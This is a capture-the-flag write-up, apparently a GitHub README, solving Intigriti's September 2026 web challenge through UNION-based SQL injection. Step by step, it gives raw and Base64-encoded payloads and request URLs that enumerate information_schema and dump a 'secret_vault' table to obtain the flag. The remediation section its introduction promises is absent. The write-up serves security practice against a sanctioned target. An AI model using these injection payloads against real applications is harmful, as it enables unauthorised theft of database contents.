<div align="center">

# 🔓 Intigriti Challenge 0926 — SQL Injection (UNION-Based)

![Difficulty](https://img.shields.io/badge/difficulty-easy--medium-yellow)
![Category](https://img.shields.io/badge/category-Web%20Exploitation-blue)
![Vuln](https://img.shields.io/badge/vuln-SQL%20Injection-red)
![Status](https://img.shields.io/badge/status-solved-success)

*A step-by-step write-up on discovering and exploiting a UNION-based SQL injection in Intigriti's September 2026 web challenge.*

</div>

---

## 📋 Table of Contents

- [Introduction](#-introduction)
- [Challenge Info](#-challenge-info)
- [Tools Used](#-tools-used)
- [Recon](#-recon)
- [Vulnerability Analysis](#-vulnerability-analysis)
- [Exploitation](#-exploitation)
  - [1. Confirming the Injection](#1-confirming-the-injection)
  - [2. Column Count Enumeration](#2-column-count-enumeration)
  - [3. Table Enumeration](#3-table-enumeration)
  - [4. Column Enumeration](#4-column-enumeration)
  - [5. Flag Extraction](#5-flag-extraction)
- [Flag](#-flag)


---

## 📖 Introduction

Intigriti regularly publishes bite-sized web exploitation challenges to help the community sharpen practical offensive security skills. Challenge 0926 presents a simple image-loading endpoint (`challenge.php`) that takes a Base64-encoded `pic` parameter. On the surface this looks like a harmless file picker — but the parameter turns out to be decoded and dropped straight into a SQL query server-side, opening the door to a textbook UNION-based SQL injection.

This write-up walks through the full process: confirming the injection, fingerprinting the query shape, enumerating the database schema, and extracting the flag — followed by root cause analysis and remediation guidance.

---

## 🎯 Challenge Info

| Field | Detail |
|---|---|
| **Platform** | Intigriti Challenges |
| **Name** | Challenge 0926 |
| **Target** | `challenge.php` |
| **Parameter** | `pic` (GET) |
| **Encoding layer** | Base64 |
| **Vulnerability class** | SQL Injection (UNION-based) |
| **Database** | MySQL / MariaDB (confirmed via `information_schema`) |
| **Impact** | Full read access to database schema and contents |

---

## 🛠️ Tools Used

- **Browser DevTools** — inspecting requests/responses
- **Burp Suite** (or browser address bar) — crafting and sending payloads
- **CyberChef / `base64` CLI** — encoding payloads before sending
- **MySQL knowledge of `information_schema`** — schema enumeration

---

## 🔍 Recon

The application accepts a single GET parameter, `pic`, whose value is Base64-encoded:

```
https://challenge-0926.challenges.intigriti.io/challenge.php?pic=<base64>
```

Decoding the default value suggested the parameter is passed server-side into a SQL query after being Base64-decoded — making it a strong candidate for injection testing once correctly encoded payloads are sent.

---

## 🧪 Vulnerability Analysis

Because the raw parameter is Base64-encoded, every payload below had to go through three steps before being sent:

1. Write the raw SQL payload.
2. Base64-encode it.
3. Send it as the `pic` value (URL-encoded if needed).

This extra encoding layer doesn't add any real protection — it only obscures the payload from casual inspection (e.g. in server logs or browser history), not from a working exploit. The server blindly decodes and executes whatever SQL arrives.

---

## 💉 Exploitation

### 1. Confirming the Injection

A single quote followed by a comment sequence was used to break the query syntax and verify the input wasn't sanitized.

| | |
|---|---|
| **Payload** | `fox'-- -` |
| **Base64** | `Zm94Jy0tIC0=` |
| **Request** | `?pic=Zm94Jy0tIC0=` |

The response changed in a way consistent with the query now succeeding (rather than erroring), confirming the backend builds a raw SQL string from this parameter.

### 2. Column Count Enumeration

With the injection point confirmed, a `UNION SELECT` was used to determine the number of columns returned by the original query — a prerequisite for any UNION-based extraction.

| | |
|---|---|
| **Payload** | `x' UNION SELECT 'FLAG_HERE'-- -` |
| **Base64** | `eCcgVU5JT04gU0VMRUNUICdGTEFHX0hFUkUnLS0gLQ==` |
| **Request** | `?pic=eCcgVU5JT04gU0VMRUNUICdGTEFHX0hFUkUnLS0gLQ==` |

✅ The query succeeded with **a single column**, confirming the original `SELECT` statement returns exactly one field.

### 3. Table Enumeration

Next, `information_schema.tables` was queried to list every table in the current database.

| | |
|---|---|
| **Payload** | `x' UNION SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()-- -` |
| **Base64** | `eCcgVU5JT04gU0VMRUNUIGdyb3VwX2NvbmNhdCh0YWJsZV9uYW1lKSBGUk9NIGluZm9ybWF0aW9uX3NjaGVtYS50YWJsZXMgV0hFUkUgdGFibGVfc2NoZW1hPWRhdGFiYXNlKCktLSAt` |
| **Request** | `?pic=eCcgVU5JT04gU0VMRUNUIGdyb3VwX2NvbmNhdCh0YWJsZV9uYW1lKSBGUk9NIGluZm9ybWF0aW9uX3NjaGVtYS50YWJsZXMgV0hFUkUgdGFibGVfc2NoZW1hPWRhdGFiYXNlKCktLSAt` |

🎯 Target table identified: **`secret_vault`**

### 4. Column Enumeration

With the table name known, its columns were enumerated via `information_schema.columns`.

| | |
|---|---|
| **Payload** | `x' UNION SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='secret_vault'-- -` |
| **Base64** | `eCcgVU5JT04gU0VMRUNUIGdyb3VwX2NvbmNhdChjb2x1bW5fbmFtZSkgRlJPTSBpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucyBXSEVSRSB0YWJsZV9uYW1lPSdzZWNyZXRfdmF1bHQnLS0gLQ==` |
| **Request** | `?pic=eCcgVU5JT04gU0VMRUNUIGdyb3VwX2NvbmNhdChjb2x1bW5fbmFtZSkgRlJPTSBpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucyBXSEVSRSB0YWJsZV9uYW1lPSdzZWNyZXRfdmF1bHQnLS0gLQ==` |

🎯 Target column identified: **`note`**

### 5. Flag Extraction

The final step dumped the contents of the `note` column directly from `secret_vault`.

| | |
|---|---|
| **Payload** | `x' UNION SELECT group_concat(note) FROM secret_vault-- -` |
| **Base64** | `eCcgVU5JT04gU0VMRUNUIGdyb3VwX2NvbmNhdChub3RlKSBGUk9NIHNlY3JldF92YXVsdC0tIC0=` |
| **Request** | `?pic=eCcgVU5JT04gU0VMRUNUIGdyb3VwX2NvbmNhdChub3RlKSBGUk9NIHNlY3JldF92YXVsdC0tIC0=` |

---

## 🏁 Flag
<img width="2348" height="1540" alt="image" src="https://github.com/user-attachments/assets/40699944-b04f-413e-9d03-49a244d81504" />

```
INTIGRITI{01a09f56-74a2-700b-a849-ffe6742327b2}
```

---


## 👤 Author

**[TOFAZZEL HOSSEN TOPU]**
🔗 GitHub: `@xpl01t-z3r0 ` · 🐦 

*Solved as part of Intigriti's monthly web challenge series — September 2026.*
